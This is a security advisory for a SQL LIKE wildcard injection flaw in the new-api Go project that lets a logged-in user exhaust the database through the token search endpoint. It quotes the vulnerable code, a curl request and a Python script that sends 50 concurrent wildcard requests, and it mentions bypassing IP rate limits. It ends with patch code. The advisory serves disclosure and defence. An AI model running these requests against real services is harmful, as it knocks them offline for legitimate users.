# [H] New API has an SQL LIKE Wildcard Injection DoS via Token Search

## Summary
Severity: High
Advisory: GHSA-w6x6-9fp7-fqm4
CVE: CVE-2026-25591
CWE: CWE-943
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-23
Source: https://github.com/advisories/GHSA-w6x6-9fp7-fqm4
Type: github-advisory

## Affected
- Go: `github.com/QuantumNous/new-api` — affected >=0 <0.10.8-alpha.10

## Details
### Summary
A SQL LIKE wildcard injection vulnerability in the `/api/token/search` endpoint allows authenticated users to cause Denial of Service through resource exhaustion by crafting malicious search patterns.

### Details
The token search endpoint accepts user-supplied `keyword` and `token` parameters that are directly concatenated into SQL LIKE clauses without escaping wildcard characters (`%`, `_`). This allows attackers to inject patterns that trigger expensive database queries.

### Vulnerable Code
File: `model/token.go:70`
```go
err = DB.Where("user_id = ?", userId).
       Where("name LIKE ?", "%"+keyword+"%").     // No wildcard escaping
       Where(commonKeyCol+" LIKE ?", "%"+token+"%").
       Find(&tokens).Error
```

### PoC

After creating over 2 million tokens, creating millions token entries is not difficult, because the rate limiting only applies to IP addresses, so multiple IP addresses can share one session, allowing for the creation of an unlimited number of tokens in batches.

<img width="1636" height="659" alt="image" src="https://github.com/user-attachments/assets/55e63dcd-884d-41bc-9bea-4300ba1b50c6" />

These data are not all loaded at once under normal circumstances, as shown in the image, and are displayed correctly. But if a request like this is submitted:

```bash
# A single request causes PostgreSQL to unconditionally retrieve all tokens belonging to that user. These requests buffer will all go into the buffer zone, causing an overflow and preventing the program from functioning properly.
curl 'http://localhost:3000/api/token/search?keyword=%&token='
```

<img width="491" height="350" alt="image" src="https://github.com/user-attachments/assets/c31d9639-3550-4e93-8735-fba068f56124" />

It will cause DoS.

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def attack(session_cookie):
    requests.get(
        'http://localhost:3000/api/token/search',
        params={'keyword': '%_%_%_%_%_%', 'token': ''},
        cookies={'session': session_cookie},
        headers={'New-API-User': '1'}
    )

# Launch 50 concurrent malicious requests
with ThreadPoolExecutor(max_workers=50) as executor:
    for _ in range(50):
        executor.submit(attack, '<valid_session>')
```

### Impact
**Availability**

RAM Overflow

<img width="1078" height="145" alt="image" src="https://github.com/user-attachments/assets/c0bb5159-6943-42bd-a9f4-5c60c57fb149" />

Postgres unavailable

<img width="772" height="185" alt="image" src="https://github.com/user-attachments/assets/245e4f59-0ec5-4f9b-a839-3c9bb61be14b" />

- Database CPU usage spike to 100%
- Application memory exhaustion
- Legitimate user requests blocked or significantly delayed
- Potential application crash or database connection pool exhaustion

### Database Performance

Testing with 2,000,000 tokens:

| Pattern | Query Time | Rows | Impact |
|---------|-----------|------|--------|
| `test` (normal) | ~50ms | 0 | Low |
| `%` (full scan) | 5,973ms | 2,000,000 | High |
| `%_%_%_%_%_%` | 6,200ms+ | 2,000,000 | Very High |

### Attack Scalability

- **Single attacker**: Can launch 10-50 concurrent requests easily
- **Multiple accounts**: Attacker can register multiple accounts (if registration enabled)
- **Proxy rotation**: IP-based rate limiting can be bypassed
- **Persistence**: Attack can be sustained indefinitely

### Resource Consumption

Each malicious request with 2M results:
- **Database**: ~6 seconds CPU time
- **Network**: ~200MB data transfer
- **Application Memory**: ~200MB+ for JSON serialization
- **Connection Time**: Database connection held for entire query duration

## Exploitation Scenario

1. Attacker registers or compromises a regular user account
2. Attacker crafts malicious LIKE patterns using `%` wildcards
3. Attacker launches concurrent requests (50-200 concurrent)
4. Database becomes overwhelmed with slow queries
5. Application memory exhausts from processing large result sets
6. Legitimate users experience service degradation or complete unavailability

 ## Patch Recommendations
### 1. Escape LIKE Wildcards (Critical)
```go
func escapeLike(s string) string {
    s = strings.ReplaceAll(s, "\\", "\\\\")
    s = strings.ReplaceAll(s, "%", "\\%")
    s = strings.ReplaceAll(s, "_", "\\_")
    return s
}

func SearchUserTokens(userId int, keyword string, token string) (tokens []*Token, err error) {
    keyword = escapeLike(keyword)
    token = strings.Trim(token, "sk-")
    token = escapeLike(token)

    err = DB.Where("user_id = ?", userId).
           Where("name LIKE ? ESCAPE '\\\\'", "%"+keyword+"%").
           Where(commonKeyCol+" LIKE ? ESCAPE '\\\\'", "%"+token+"%").
           Limit(1000).
           Find(&tokens).Error
    return tokens, err
}
```

### 2. Add User-Level Rate Limiting
```go
tokenRoute.GET("/search",
    middleware.TokenSearchRateLimit(),  // 30 req/min per user
    controller.SearchTokens)
```

### 3. Add Query Timeout
```go
ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
defer cancel()
err = DB.WithContext(ctx).Where(...).Find(&tokens).Error
```

## References
- https://github.com/QuantumNous/new-api/security/advisories/GHSA-w6x6-9fp7-fqm4
- https://nvd.nist.gov/vuln/detail/CVE-2026-25591
- https://github.com/QuantumNous/new-api/commit/3e1be18310f35d20742683ca9e4bf3bcafc173c5
- https://github.com/QuantumNous/new-api
- https://github.com/QuantumNous/new-api/releases/tag/v0.10.8-alpha.10
- https://pkg.go.dev/vuln/GO-2026-4531
